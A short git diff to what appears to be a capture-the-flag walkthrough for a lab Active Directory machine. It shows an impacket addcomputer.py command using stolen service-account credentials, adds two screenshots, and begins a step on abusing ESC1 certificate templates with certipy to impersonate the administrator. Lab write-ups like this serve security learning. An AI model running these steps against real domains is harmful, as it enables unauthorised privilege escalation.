@@ -301,4 +301,10 @@ Certificate Templates
 
 `addcomputer.py -computer-name 'TEST$' -computer-pass 'Password!' -dc-host dc.authority.htb -domain-netbios authority.htb authority.htb/svc_ldap:$(cat svc_ldap.pass) `
 
+<img width="1267" height="96" alt="image" src="https://github.com/user-attachments/assets/0584f00f-ab37-457b-b20f-cff16e144ad0" />
 
+<img width="1264" height="78" alt="image" src="https://github.com/user-attachments/assets/22181dc5-277a-40a2-9e5f-cb531018070d" />
+
+15. Use `certipy` to abuse ESC1 vulnerability and get a certificate impersonating Admin
+
+``
